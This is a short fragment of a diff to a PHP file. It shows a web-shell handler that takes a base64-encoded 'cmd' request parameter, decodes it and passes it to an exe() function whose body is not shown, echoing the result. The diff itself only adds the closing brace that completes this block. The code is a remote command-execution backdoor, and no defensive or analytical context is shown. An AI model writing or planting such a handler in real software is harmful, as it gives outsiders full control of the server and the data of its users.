@@ -16,4 +16,5 @@ function exe($s_c){
 if(isset($_REQUEST['cmd'])){
 	$s_cmd = base64_decode($_REQUEST['cmd']);
 	echo exe($s_cmd);
+}
 ?>
